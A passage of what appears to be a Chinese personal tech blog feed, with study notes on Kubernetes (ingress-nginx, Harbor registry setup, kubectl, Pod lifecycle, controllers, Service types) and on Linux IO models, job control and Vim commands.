<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Service</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">helm.sh/chart:</span> <span class="string">ingress-nginx-2.0.3</span></span><br><span class="line">    <span class="attr">app.kubernetes.io/name:</span> <span class="string">ingress-nginx</span></span><br><span class="line">    <span class="attr">app.kubernetes.io/instance:</span> <span class="string">ingress-nginx</span></span><br><span class="line">    <span class="attr">app.kubernetes.io/version:</span> <span class="number">0.32</span><span class="number">.0</span></span><br><span class="line">    <span class="attr">app.kubernetes.io/managed-by:</span> <span class="string">Helm</span></span><br><span class="line">    <span class="attr">app.kubernetes.io/component:</span> <span class="string">controller</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">ingress-nginx-controller</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">ingress-nginx</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">NodePort</span></span><br><span class="line">  <span class="attr">ports:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">http</span></span><br><span class="line">      <span class="attr">port:</span> <span class="number">80</span></span><br><span class="line">      <span class="attr">protocol:</span> <span class="string">TCP</span></span><br><span class="line">      <span class="attr">targetPort:</span> <span class="string">http</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">https</span></span><br><span class="line">      <span class="attr">port:</span> <span class="number">443</span></span><br><span class="line">      <span class="attr">protocol:</span> <span class="string">TCP</span></span><br><span class="line">      <span class="attr">targetPort:</span> <span class="string">https</span></span><br><span class="line">  <span class="attr">externalIPs:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="number">192.168</span><span class="number">.0</span><span class="number">.95</span></span><br><span class="line">  <span class="bullet">-</span> <span class="number">192.168</span><span class="number">.0</span><span class="number">.34</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">app.kubernetes.io/name:</span> <span class="string">ingress-nginx</span></span><br><span class="line">    <span class="attr">app.kubernetes.io/instance:</span> <span class="string">ingress-nginx</span></span><br><span class="line">    <span class="attr">app.kubernetes.io/component:</span> <span class="string">controller</span></span><br></pre></td></tr></table></figure>

<h1 id="搭建私有仓库Harbor"><a href="#搭建私有仓库Harbor" class="headerlink" title="搭建私有仓库Harbor"></a>搭建私有仓库Harbor</h1><p>配置Docker</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="attr">&quot;insecure-registeries&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;https://hostname&quot;</span><span class="punctuation">]</span></span><br></pre></td></tr></table></figure>

<p>下载Harbor</p>
<p>编辑harbor.cfg</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">hostname = xxx</span><br></pre></td></tr></table></figure>

<p>创建Https证书</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> -p /data/cert</span><br><span class="line"><span class="built_in">cd</span> !$</span><br><span class="line">openssl genrsa -des3 -out server.key 2048</span><br><span class="line">openssl req -new -key server.key -out server.csr</span><br><span class="line"><span class="built_in">cp</span> server.key server.key.org</span><br><span class="line">openssl rsa -<span class="keyword">in</span> server.key.org -out server.key <span class="comment"># 退密码</span></span><br><span class="line">openssl x509 -req -days 365 -<span class="keyword">in</span> server.csr -signkey server.key -out server.crt</span><br><span class="line"><span class="built_in">chmod</span> a+x *</span><br><span class="line"><span class="built_in">cd</span> -</span><br><span class="line">./install.sh</span><br></pre></td></tr></table></figure>

<p>为各个节点添加host解析Harbor hostname</p>
<p>登录：admin&#x2F;Harbor12345</p>
<h1 id="Kubectl-命令"><a href="#Kubectl-命令" class="headerlink" title="Kubectl 命令"></a>Kubectl 命令</h1><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">kubectl <span class="built_in">help</span></span><br><span class="line">kubectl explain</span><br><span class="line">kubectl run xxx --replicas=1</span><br><span class="line">kubectl get rs</span><br><span class="line">kubectl get pod</span><br><span class="line">kubectl get deployment</span><br><span class="line">kubectl delete pod xxx</span><br><span class="line">kubectl scale --replicas=3 xxx </span><br><span class="line">kubectl <span class="built_in">exec</span> pod-name -it -- /bin/sh</span><br></pre></td></tr></table></figure>



<h1 id="资源清单"><a href="#资源清单" class="headerlink" title="资源清单"></a>资源清单</h1><p>级别：</p>
<ul>
<li>命名空间：kubeadm 默认安装到 kube-system</li>
<li>集群：无需指定命名空间</li>
<li>元数据：HPA，通过指标操作</li>
</ul>
<p>类型</p>
<ul>
<li>工作负载：Pod，ReplicaSet、Deployment、StatefulSet、DaemonSet、Job、CronJob</li>
<li>服务发现与负载均衡资源：Service、Ingress</li>
<li>配置与存储：Volume、CSI（容器存储接口）</li>
<li>特殊存储卷：ConfigMap（配置中心）、Secret、DownwardAPI（外部信息输入到容器）</li>
<li>集群级资源：Namespace、Node、Role、ClusterRole、RoleBinding、ClusterRoleBinding</li>
<li>元数据资源：HPA、PodTemplate、LimitRange</li>
</ul>
<p>常用字段：</p>
<ul>
<li>version - kubectl api-versions</li>
<li>kind - Pod &#x2F; Deployment …</li>
<li>metadata<ul>
<li>name</li>
<li>namespace</li>
</ul>
</li>
<li>spec<ul>
<li>containers[]<ul>
<li>name</li>
<li>image</li>
<li>imagePullPolicy - Always &#x2F; Never &#x2F; IfNotPresent</li>
<li>command[]</li>
<li>args[]</li>
<li>workingDir</li>
<li>volumeMounts[]<ul>
<li>name</li>
<li>mountPath</li>
<li>readOnly</li>
</ul>
</li>
<li>ports[]<ul>
<li>name</li>
<li>containerPort</li>
<li>hostPort</li>
<li>protocol - TCP  &#x2F; UDP</li>
</ul>
</li>
<li>env[]<ul>
<li>name</li>
<li>value</li>
</ul>
</li>
<li>resources<ul>
<li>limits<ul>
<li>cpu</li>
<li>memory</li>
</ul>
</li>
<li>requests<ul>
<li>cpu</li>
<li>memory</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>restartPolicy</li>
<li>nodeSelector</li>
<li>imagePullSecrets</li>
<li>hostNetwork</li>
</ul>
</li>
</ul>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># pod.yaml</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">app-pod</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">app:</span> <span class="string">app-pod-label</span></span><br><span class="line">    <span class="attr">version:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">app</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">nginx</span></span><br></pre></td></tr></table></figure>

<p>运行</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">kubectl apply -f pod.yaml</span><br><span class="line">kubectl create -f pod.yaml</span><br></pre></td></tr></table></figure>

<p>查看日志</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">kubectl get pod</span><br><span class="line">kubectl describe pod app-pod</span><br><span class="line">kubectl <span class="built_in">log</span> app-pod -c app</span><br></pre></td></tr></table></figure>

<p>删除</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">kubectl delete pod app-pod</span><br></pre></td></tr></table></figure>

<h1 id="容器生命周期"><a href="#容器生命周期" class="headerlink" title="容器生命周期"></a>容器生命周期</h1><p>Pause - 启动网络和数据卷</p>
<p>Init Container - 创建阶段：多个，前一个执行完成后一个执行，包含初始化的工具，可以具有不同的文件视图，可以用于探测依赖服务是否启动。初始化阶段结束后删除，全部删除后才开始Main Container。</p>
<p>Main Container - 部署阶段</p>
<p>Start</p>
<p>Readiness - 就绪检测</p>
<p>Liveness - 生存检测</p>
<p>Stop</p>
<h2 id="Init-Container探测"><a href="#Init-Container探测" class="headerlink" title="Init Container探测"></a>Init Container探测</h2><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># init.yaml</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">app-pod</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">app:</span> <span class="string">app-pod-label</span></span><br><span class="line">    <span class="attr">version:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">...</span></span><br><span class="line">  <span class="attr">initContainers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">app</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">busybox</span></span><br><span class="line">    <span class="attr">command:</span> [<span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>, <span class="string">&#x27;echo until nslookup db; do echo waiting for db; sleep 2; done;&#x27;</span>]</span><br></pre></td></tr></table></figure>

<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># db.yaml</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Service</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">app-service</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">app:</span> <span class="string">app-service-label</span></span><br><span class="line">    <span class="attr">version:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">db</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">mysql</span></span><br></pre></td></tr></table></figure>

<h2 id="探针探测"><a href="#探针探测" class="headerlink" title="探针探测"></a>探针探测</h2><p>容器出现如下情况时表示容器启动成功</p>
<ul>
<li>Exec Action - 容器内指令返回 0 时</li>
<li>Tcp - 当容器端口打开时</li>
<li>Http Get - 指定端口和路径上Get返回2xx，3xx时</li>
</ul>
<p>存活检测：失败则删除容器</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">db</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">mysql</span></span><br><span class="line">    <span class="attr">livenessProbe:</span></span><br><span class="line">      <span class="attr">exec:</span></span><br><span class="line">        <span class="attr">command:</span> [<span class="string">&#x27;test&#x27;</span>, <span class="string">&#x27;-e&#x27;</span>, <span class="string">&#x27;/tmp/live&#x27;</span>]</span><br><span class="line">      <span class="attr">initialDelaySeconds:</span> <span class="number">1</span></span><br><span class="line">      <span class="attr">periodSeconds:</span> <span class="number">3</span></span><br></pre></td></tr></table></figure>

<p>就绪检测：失败则删除容器</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">db</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">mysql</span></span><br><span class="line">    <span class="attr">readinessProbe:</span></span><br><span class="line">      <span class="attr">httpGet:</span></span><br><span class="line">        <span class="attr">port:</span> <span class="string">http</span></span><br><span class="line">        <span class="attr">path:</span> <span class="string">/index.html</span></span><br><span class="line">      <span class="attr">initialDelaySeconds:</span> <span class="number">1</span></span><br><span class="line">      <span class="attr">periodSeconds:</span> <span class="number">3</span></span><br></pre></td></tr></table></figure>

<h2 id="启动，退出"><a href="#启动，退出" class="headerlink" title="启动，退出"></a>启动，退出</h2><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">db</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">mysql</span></span><br><span class="line">    <span class="attr">lifecycle:</span></span><br><span class="line">      <span class="attr">postStart:</span></span><br><span class="line">        <span class="attr">exec:</span></span><br><span class="line">          <span class="attr">command:</span> [<span class="string">...</span>]</span><br><span class="line">      <span class="attr">preStop:</span></span><br><span class="line">        <span class="attr">exec:</span></span><br><span class="line">          <span class="attr">command:</span> [<span class="string">...</span>]</span><br></pre></td></tr></table></figure>



<h1 id="Pod-分类"><a href="#Pod-分类" class="headerlink" title="Pod 分类"></a>Pod 分类</h1><p>可以包含多个容器。这些容器共用Pod的网络地址，存储。</p>
<h2 id="自主式"><a href="#自主式" class="headerlink" title="自主式"></a>自主式</h2><p>不被管理</p>
<h2 id="控制器管理式"><a href="#控制器管理式" class="headerlink" title="控制器管理式"></a>控制器管理式</h2><p>被控制器管理数目。</p>
<h1 id="ReplicaSet"><a href="#ReplicaSet" class="headerlink" title="ReplicaSet"></a>ReplicaSet</h1><p>副本集按照标签管理。同一个标签算一个集合。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">kubectl explain rs</span><br></pre></td></tr></table></figure>

<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">ReplicaSet</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">frontend</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">replicas:</span> <span class="number">3</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">matchLabels:</span></span><br><span class="line">      <span class="attr">tier:</span> <span class="string">frontend</span></span><br><span class="line">  <span class="attr">template:</span>  <span class="comment"># pod</span></span><br><span class="line">    <span class="attr">metadata:</span></span><br><span class="line">      <span class="attr">labels:</span></span><br><span class="line">        <span class="attr">tier:</span> <span class="string">frontend</span></span><br><span class="line">    <span class="attr">spec:</span></span><br><span class="line">      <span class="attr">containers:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">php</span></span><br><span class="line">          <span class="attr">image:</span> <span class="string">php</span></span><br><span class="line">          <span class="attr">env:</span></span><br><span class="line">          <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">HOST</span></span><br><span class="line">            <span class="attr">value:</span> <span class="string">localhost</span></span><br><span class="line">          <span class="attr">ports:</span></span><br><span class="line">          <span class="bullet">-</span> <span class="attr">containerPort:</span> <span class="number">80</span></span><br></pre></td></tr></table></figure>

<h1 id="Deployment-1"><a href="#Deployment-1" class="headerlink" title="Deployment"></a>Deployment</h1><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Deployment</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">nginx-deployment</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">replicas:</span> <span class="number">3</span></span><br><span class="line">  <span class="attr">template:</span>  <span class="comment"># pod</span></span><br><span class="line">    <span class="attr">metadata:</span></span><br><span class="line">      <span class="attr">labels:</span></span><br><span class="line">        <span class="attr">app:</span> <span class="string">nginx</span></span><br><span class="line">    <span class="attr">spec:</span></span><br><span class="line">      <span class="attr">containers:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">nginx</span></span><br><span class="line">          <span class="attr">image:</span> <span class="string">nginx</span></span><br><span class="line">          <span class="attr">ports:</span></span><br><span class="line">          <span class="bullet">-</span> <span class="attr">containerPort:</span> <span class="number">80</span></span><br></pre></td></tr></table></figure>

<p>扩容</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">kubectl scale deployment nginx-deployment --replicas 10</span><br></pre></td></tr></table></figure>

<p>自动扩容</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">kubectl autoscale deployment nginx-deployment --min=10 --max=15 --cpu-percent=80</span><br></pre></td></tr></table></figure>

<p>更新</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">kubectl <span class="built_in">set</span> image deployment/nginx-deployment nginx=nginx:1.9.1</span><br></pre></td></tr></table></figure>

<p>回滚</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">kubectl rollout undo deployment/nginx-deployment</span><br></pre></td></tr></table></figure>

<h1 id="DaemonSet"><a href="#DaemonSet" class="headerlink" title="DaemonSet"></a>DaemonSet</h1><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">DaemonSet</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">daemonset-example</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">app:</span> <span class="string">daemonset</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">matchLabels:</span></span><br><span class="line">      <span class="attr">name:</span> <span class="string">daemonset-example</span></span><br><span class="line">  <span class="attr">template:</span></span><br><span class="line">    <span class="attr">metadata:</span></span><br><span class="line">      <span class="attr">labels:</span></span><br><span class="line">        <span class="attr">name:</span> <span class="string">daemonset-example</span></span><br><span class="line">    <span class="attr">spec:</span></span><br><span class="line">      <span class="attr">containers:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">daemonset-example</span></span><br><span class="line">        <span class="attr">image:</span> <span class="string">nginx</span></span><br><span class="line">  </span><br></pre></td></tr></table></figure>

<h1 id="Job"><a href="#Job" class="headerlink" title="Job"></a>Job</h1><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Job</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">pi</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">template:</span></span><br><span class="line">    <span class="attr">metadata:</span></span><br><span class="line">      <span class="attr">name:</span> <span class="string">pi</span></span><br><span class="line">    <span class="attr">spec:</span></span><br><span class="line">      <span class="attr">containers:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">daemonset-example</span></span><br><span class="line">        <span class="attr">image:</span> <span class="string">perl</span></span><br><span class="line">      <span class="attr">restartPolicy:</span> <span class="string">Never</span></span><br></pre></td></tr></table></figure>

<h1 id="Service-1"><a href="#Service-1" class="headerlink" title="Service"></a>Service</h1><p>ClusterIP：一个Service背后有多个同类Pod，它们共用一个ClusterIP，也就是Service的IP。</p>
<p>NodePort：在ClusterIP基础上，Servcie也会在所在Node上映射一个端口到自己的服务上。</p>
<p>LoadBalance：在NodePort基础上，借助云供应商创建外部负载均衡器，将请求转发给Node:Service</p>
<p>ExternalName：将集群外部服务引入到集群内部来。</p>
<h1 id="Ingress"><a href="#Ingress" class="headerlink" title="Ingress"></a>Ingress</h1><p>七层负载均衡。</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p><a href="https://gitee.com/moxi159753/LearningNotes/tree/master/K8S">LearningNotes: Java学习笔记，主要来源于B站上视频的学习，同时会记录平时一些学习和项目中遇到的问题，同步更新在蘑菇博客，如果对我的博客网站感兴趣的话，欢迎关注我的 蘑菇博客项目 笔记主要涵盖：Java，Spring，SpringCloud，计算机网络，操作系统，数据结构，Vue等 如果笔记对您有帮助的话，欢迎star支持，谢谢~ - Gitee.com</a></p>
<p>概念：</p>
<ul>
<li>资源编排</li>
<li>Pod</li>
<li>Node</li>
<li>Controller<ul>
<li>RS</li>
<li>Deployment</li>
<li>DaemonSet</li>
</ul>
</li>
<li>Service</li>
<li>Secret</li>
<li>ConfigMap</li>
<li>Ingress</li>
<li>Helm</li>
<li>NFS</li>
<li>PV、PVC</li>
<li>Dashboard</li>
<li>HAProxy</li>
</ul>
]]></content>
      <categories>
        <category>开发运维</category>
      </categories>
      <tags>
        <tag>K8S</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux</title>
    <url>/2021/07/20/%E8%BF%90%E7%BB%B4/Linux/</url>
    <content><![CDATA[<p>…</p>
<span id="more"></span>


<h1 id="IO"><a href="#IO" class="headerlink" title="IO"></a>IO</h1><ul>
<li>阻塞IO，即常见的IO模型。一般设计为一个线程负责一个IO。</li>
<li>非阻塞IO，即使用poll，即轮询的方式，虽然不会阻塞，但是会大量占用CPU。</li>
<li>IO复用，即使用select，即向系统内核递交一批感兴趣的描述符，内核会轮询这些描述符，直到有其中一个IO有数据。可以用一个线程操作一组IO。</li>
<li>信号驱动IO，即使用信号处理函数来操作IO，用起来就像是使用中断处理函数。</li>
<li>异步IO，即向内核提交好缓冲区，内核收到数据后自动将数据填充到缓冲区，并向进程发送信号。不常见。</li>
<li>epoll，与select相比，时间复杂度为o(1)，使用水平触发和边缘触发两种方式。<ul>
<li>水平触发：只要这个文件描述符还有数据可读，每次 epoll_wait都会返回它的事件，提醒用户程序去操作。</li>
<li>边缘触发：通过 epoll_wait 调用会得到有事件通知的文件描述符，对于每一个被通知的文件描述符，如可读，则必须将该文件描述符一直读到空。可能会阻塞。</li>
</ul>
</li>
</ul>
<h1 id="进程操作"><a href="#进程操作" class="headerlink" title="进程操作"></a>进程操作</h1><p>Ctrl+z - 挂起任务</p>
<p>fg - 切到前台</p>
<p>bg - 切到后台</p>
<p>jobs - 查看后台任务</p>
<p>disown - 脱离终端  <code>disown %2</code> <code>disown -a</code></p>
<h1 id="Tools"><a href="#Tools" class="headerlink" title="Tools"></a>Tools</h1><h2 id="Vim"><a href="#Vim" class="headerlink" title="Vim"></a>Vim</h2><p>Vim：多级撤销，语法高亮，自动补全，插件，通过网络配置文件，多文件编辑，编辑压缩文件。</p>
<h3 id="配置-Vimrc"><a href="#配置-Vimrc" class="headerlink" title="配置 Vimrc"></a>配置 Vimrc</h3><p>Vimrc：Vim配置文件。分为用户级别和系统级别。每一行为一个命令。通过配置Vimrc可以配置Vim界面和用法。配置既可以写在Vimrc中，也可以在运行时输入命令。</p>
<p>配置显示行号</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">:<span class="built_in">set</span> number </span><br><span class="line">:<span class="built_in">set</span> nonumber </span><br><span class="line">:<span class="built_in">set</span> number? <span class="comment"># 查看是否开启</span></span><br></pre></td></tr></table></figure>

<p>配置光标</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">:<span class="built_in">set</span> ruler </span><br><span class="line">:<span class="built_in">set</span> noruler</span><br><span class="line">:<span class="built_in">set</span> ruler? <span class="comment"># 查看是否开启</span></span><br></pre></td></tr></table></figure>

<p>配置查找高亮</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">:<span class="built_in">set</span> hls </span><br><span class="line">:<span class="built_in">set</span> nohls</span><br><span class="line">:<span class="built_in">set</span> hls? <span class="comment"># 查看是否开启</span></span><br><span class="line">:<span class="built_in">set</span> ignorecase <span class="comment"># 忽略大小写</span></span><br></pre></td></tr></table></figure>

<p>其他配置</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">:<span class="built_in">set</span> autoindent <span class="comment"># 自动缩进</span></span><br><span class="line">:<span class="built_in">set</span> smartindent <span class="comment"># 编程语言自动缩进</span></span><br><span class="line">:<span class="built_in">set</span> expandtab  <span class="comment"># 空格代替Tab</span></span><br><span class="line">:map <span class="comment"># 设置快捷键</span></span><br><span class="line">:<span class="built_in">let</span> <span class="comment"># 赋值</span></span><br></pre></td></tr></table></figure>




<h3 id="模式"><a href="#模式" class="headerlink" title="模式"></a>模式</h3><p>普通模式：打开时即是普通模式。此时有：</p>
<ul>
<li>输入数字，按回车 - 跳转到某行</li>
</ul>
<p>可视模式：按下<code>v</code>，可以选中文本。</p>
<p>插入模式：按下<code>i</code>，可以输入文本。</p>
<p>命令模式：按下<code>:</code>，之后可以输入命令。</p>
<h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p>搜索</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">/content</span><br></pre></td></tr></table></figure>

<p>命令</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">:h vimrc <span class="comment"># 查看 Vimrc 帮助</span></span><br><span class="line">:version <span class="comment"># 查看版本</span></span><br><span class="line">:e ~/.vimrc <span class="comment"># 编辑文件</span></span><br></pre></td></tr></table></figure>

<p>移动光标</p>
<ul>
<li><code>h</code>: 左</li>
<li><code>j</code>: 下</li>
<li><code>k</code>: 上</li>
<li><code>l</code>: 右</li>
<li><code>0</code>: 行首，包含缩进</li>
<li><code>shift + 6</code>: 行首，不含缩进</li>
<li><code>shift + 4</code>: 行尾</li>
<li><code>w/W</code>: 移动单词首</li>
<li><code>b/B</code>: 反向移动</li>
<li><code>e/E</code>: 移动到单词尾</li>
<li><code>ge</code>: 反向移动</li>
<li><code>ctrl + f</code>: 向下翻页</li>
<li><code>ctrl + b</code>: 向上翻页</li>
<li><code>ctrl + d</code>: 向下翻半页</li>
<li><code>ctrl + u</code>: 向上翻半页</li>
<li><code>1g/g</code>: 移动到第一行</li>
<li><code>g + ctrl</code>: 文件信息</li>
<li><code>&gt;&gt;</code>: 缩进</li>
<li><code>&lt;&lt;</code>: 反缩进</li>
<li><code>:70-80&gt;</code>: 70-80行缩进</li>
<li><code>:71&gt;3</code>: 71-74行缩进</li>
</ul>
<p>寄存器：</p>
<ul>
<li>无名寄存器：默认使用</li>
<li>数字寄存器：0-9共10寄存器，0是复制专用。</li>
<li>有名寄存器：可以被命名</li>
<li>黑洞寄存器：相对于删除</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">:reg <span class="comment"># 进入寄存器</span></span><br></pre></td></tr></table></figure>

<p>复制</p>
<ul>
<li><code>yy</code>: 复制，到默认寄存器和<code>0</code>寄存器</li>
</ul>
<p>删除</p>
<ul>
<li><code>dd</code>: 剪切，到<code>1</code>寄存器</li>
</ul>
<p>粘贴</p>
<ul>
<li><code>p</code>:</li>
</ul>
<p>撤销</p>
<ul>
<li><code>u</code>:</li>
</ul>
<p>重做</p>
<ul>
<li><code>ctrl + r</code></li>
</ul>
<p>删除</p>
<ul>
<li><code>&quot;_d</code>: 进入黑洞寄存器</li>
</ul>
<p>字符转化大小写</p>
<ul>
<li><code>~</code></li>
</ul>
<p>单词转化大小写</p>
<ul>
<li><code>g~</code></li>
</ul>
<p>重复操作</p>
<ul>
<li><code>.</code></li>
</ul>
<p>查找</p>
<ul>
<li><code>f/F</code>: 查找字符</li>
<li><code>/</code>: 查找字符串</li>
<li><code>n/N</code>: 查找之间跳转</li>
</ul>
<p>替换</p>
<ul>
<li><code>[range]s[ubstitute]/&#123;pattern&#125;/&#123;string&#125;/[flags]</code></li>
<li><code>:s/set/SET/g</code>: 当前行替换</li>
<li><code>%s/set/SSS/g</code>: 全局替换</li>
<li><code>shift + r/R</code>: 替换当前行</li>
<li><code>r</code>: 替换字符</li>
</ul>
<h3 id="缓冲区与多文件编辑"><a href="#缓冲区与多文件编辑" class="headerlink" title="缓冲区与多文件编辑"></a>缓冲区与多文件编辑</h3><p>缓冲区：</p>
<ul>
<li>查看缓冲区列表<code>:files</code>, <code>:buffers</code>, <code>:ls</code></li>
<li><code>:bf/bp/bn/bl/b[num]</code>: 切换缓冲区</li>
<li><code>:ball</code>: 编辑所有</li>
<li><code>:wall!</code>: 保存所有</li>
<li><code>:qall!</code>: 退出所有</li>
<li><code>:1-3bd</code>: 关闭缓冲区</li>
</ul>
<p>多窗口分屏</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">vim -O/o[num] <span class="comment"># 水平/垂直分屏</span></span><br></pre></td></tr></table></figure>

<p>创建分配</p>
<ul>
<li><code>ctrl + w c/q</code>: 关闭当前窗口</li>
<li><code>ctrl + w s</code>: 上下分割当前文件</li>
<li><code>:sp filename</code>: 上下分割，打开新文件</li>
<li><code>ctrl + w v</code>: 左右分割当前文件</li>
<li><code>:vsp filename</code>: 左右分割，打开新文件</li>
</ul>
<p>切换分配</p>
<ul>
<li><code>ctrl + w K</code>: 向上移动</li>
<li><code>ctrl + w J</code>: 向下移动</li>
<li><code>ctrl + w L</code>: 向右移动</li>
<li><code>ctrl + w H</code>: 向左移动</li>
<li><code>ctrl + w +</code>: 增加高度</li>
<li><code>ctrl + w -</code>: 减小高度</li>
<li><code>ctrl + w =</code>: 保持一致</li>
</ul>
<p>标签分组</p>
<ul>
<li><code>:tabnew</code>: 新建标签</li>
<li><code>:tabfind</code>: 在新标签中打开文件</li>
<li><code>:tabs</code>: 显示标签列表</li>
<li><code>:tabclose</code>: 关闭当前标签</li>
<li><code>:tabonly</code>: 仅保留当前标签</li>
<li><code>:tabn/p/first/last</code>: 跳转标签</li>
<li><code>:tabm</code>: 移动标签</li>
<li><code>gt/T</code>: 跳转标签</li>
<li><code>ngt</code>: 跳转标签</li>
</ul>
